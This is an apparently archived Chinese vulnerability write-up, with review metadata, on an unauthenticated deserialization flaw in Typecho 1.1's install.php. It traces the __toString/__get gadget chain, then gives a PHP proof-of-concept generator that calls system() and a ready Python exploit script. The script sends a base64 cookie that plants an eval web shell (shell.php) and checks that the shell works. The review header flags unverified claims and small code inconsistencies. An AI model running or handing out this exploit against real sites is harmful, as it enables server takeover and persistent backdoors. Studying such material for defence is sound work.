---
source: "hatch 补库批 20260928"
product: "Typecho1.1 testedPHP5.6/Apache/Windows"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Typecho 1.1 反序列化漏洞导致前台getshell"
prerequisites: "来源所述条件，未列明部分仍待核：install.php存在，finish参数和Referer非空；TypechoFeed/Request gadgets；字符串assert旧PHP"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-0994fb1d55ca5acd9a937aac"
entity_id: "ve-0994fb1d55ca5acd9a937aac"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：install.php存在，finish参数和Referer非空；TypechoFeed/Request gadgets；字符串assert旧PHP

- **适用与权限边界（1）**：条件源码isset finish而文字不为空不完全等价；PHP生成器system(id)与Windows实验命令不兼容需说明独立环境。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **证据待核（2）**：Python写shell载荷与生成器命令载荷不同；shellpath=self.url+'shell.php'缺斜杠而vulnpath加斜杠，根URL规范化问题。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **证据待核（3）**：category异常用于保留输出的解释缺具体错误机理，代码主链仅图；固定Configure Command标志可能漏平台。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **适用与权限边界（4）**：无CVE/修复版本，保留不需要登录与安装器条件。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Typecho 1.1 反序列化漏洞导致前台getshell

一、漏洞简介
------------

二、漏洞影响
------------

Typecho 1.1

三、复现过程
------------

### 漏洞分析

复现环境：PHP5.6+Apache+Windows

![](./.resource/Typecho1.1反序列化漏洞导致前台getshell/media/rId25.jpg)

`Typecho_Cookie::get`目的是获取Cookie，可从Cookie或POST中获取

![](./.resource/Typecho1.1反序列化漏洞导致前台getshell/media/rId26.jpg)

要执行到此处需要经过前面的各种判断条件：

1.  \$\_GET\['finish'\] 不为空
2.  \$\_SERVER\['HTTP\_REFERER'\] 不为空

<!-- -->

    //判断是否已经安装
    if (!isset($_GET['finish']) && file_exists(__TYPECHO_ROOT_DIR__ . '/config.inc.php') && empty($_SESSION['typecho'])) {
        exit;
    }
    // 挡掉可能的跨站请求
    if (!empty($_GET) || !empty($_POST)) {
        if (empty($_SERVER['HTTP_REFERER'])) {
            exit;
        }
    }

接下来需要寻找利用链，常见魔法方法：

    __construct()//创建对象时触发
    __destruct() //对象被销毁时触发
    __call() //在对象上下文中调用不可访问的方法时触发
    __callStatic() //在静态上下文中调用不可访问的方法时触发
    __get() //用于从不可访问的属性读取数据
    __set() //用于将数据写入不可访问的属性
    __isset() //在不可访问的属性上调用isset()或empty()触发
    __unset() //在不可访问的属性上使用unset()时触发
    __invoke() //当脚本尝试将对象调用为函数时触发
    __wakeup() //使用unserialize时触发
    __sleep() //使用serialize时触发
    __toString()//类当String用

误以为是通过\_\_desctruct()和\_\_wakeup()触发，没想到起始是利用\_\_toString()，接着通过\_\_get()触发。

回到`install.php`中看232行中\$config\['adapter'\]作为了Typecho\_Db()参数，只要控制\$config\['adapter'\]的值为某一个类的对象就可以触发\_\_toString()，那么\$config的值应为一个数组。

![](./.resource/Typecho1.1反序列化漏洞导致前台getshell/media/rId27.jpg)

![](./.resource/Typecho1.1反序列化漏洞导致前台getshell/media/rId28.jpg)

接下来寻找\_\_toString()方法，在`var/Typecho/Feed.php`中找到

![](./.resource/Typecho1.1反序列化漏洞导致前台getshell/media/rId29.jpg)

\$item可控，如果\$item\['author'\]为某个不存在screenName属性的类对象时，自动触发\_\_get()方法`var/Typecho/Request.php`，如下图，显然可控吧\~

![](./.resource/Typecho1.1反序列化漏洞导致前台getshell/media/rId30.jpg)

### 漏洞复现

根据漏洞分析写出poc

    <?php
    class Typecho_Request{
        private $_params = array();
        private $_filter = array();

        public function __construct(){
            $this->_params = array("screenName"=>"id");
            $this->_filter = array("system");
        }
    }

    class Typecho_Feed{
        private $_items = array();
        private $_type;

        public function __construct(){
            $this->_items = array(
                array(
                    "author"=>new Typecho_Request(),
                    "link"=>"link",
                    "title"=>"title",
                    "date"=>"date",
                    "category"=>array(new Typecho_Request()),#注意点
                )
            );
            $this->_type = "RSS 2.0";
        }
    }

    $a =  array("adapter"=>new Typecho_Feed());
    #echo serialize(($a))."\n";
    echo base64_encode(serialize(($a)))."\n";

> 关于poc中注意点说明：
>
> 在漏洞分析时并没有涉及该行相关数据，在没有这一行数据时：
>
> 程序继续进入到Db.php的构造方法中，并在下图汇总抛出异常

![](./.resource/Typecho1.1反序列化漏洞导致前台getshell/media/rId32.jpg)

如果是命令是写入文件，则不会影响结果，但如果需要显示命令结果，则无法实现，因而考虑在抛出异常之前结束运行程序运行

![](./.resource/Typecho1.1反序列化漏洞导致前台getshell/media/rId33.jpg)

最终结果

![](./.resource/Typecho1.1反序列化漏洞导致前台getshell/media/rId34.jpg)

Python脚本，**仅用作学习目的**

    import sys
    import requests

    class Typecho_install_getshell_Test:
        def __init__(self,url):
            self.url = url

        def run(self):
            headers = {
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
                "Cookie":"__typecho_config=YToxOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6NTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjU6ImZpbGVfcHV0X2NvbnRlbnRzKCdzaGVsbC5waHAnLCc8P3BocCBAZXZhbCgkX1BPU1RbXCdwYXNzXCddKTs/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX1zOjQ6ImxpbmsiO3M6NDoibGluayI7czo1OiJ0aXRsZSI7czo1OiJ0aXRsZSI7czo0OiJkYXRlIjtzOjQ6ImRhdGUiO3M6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjU6ImZpbGVfcHV0X2NvbnRlbnRzKCdzaGVsbC5waHAnLCc8P3BocCBAZXZhbCgkX1BPU1RbXCdwYXNzXCddKTs/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjE5OiIAVHlwZWNob19GZWVkAF90eXBlIjtzOjc6IlJTUyAyLjAiO319;XDEBUG_SESSION=15908",
                "Referer":self.url,
            }
            vulnpath = self.url + "/install.php?finish=1"
            try:
                requests.get(vulnpath,headers=headers,timeout=10)
                shellpath = self.url + "shell.php"
                data = {
                    "pass":"phpinfo();",
                }
                re = requests.post(shellpath,headers=headers,data=data,timeout=10)
                re.encoding = re.apparent_encoding
                if "Configure Command " in re.text:
                    print("[+]Typecho反序列化漏洞存在! \nPayload: "+ shellpath + "\tPassWord: pass")
                else:
                    print("[-]Typecho漏洞可能不存在!")
            except:
                print("[-]Something wrong!")

    if __name__ == "__main__":
        Vuln = Typecho_install_getshell_Test(sys.argv[1])
        Vuln.run()

参考链接
--------

> http://pines404.online/2020/01/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/
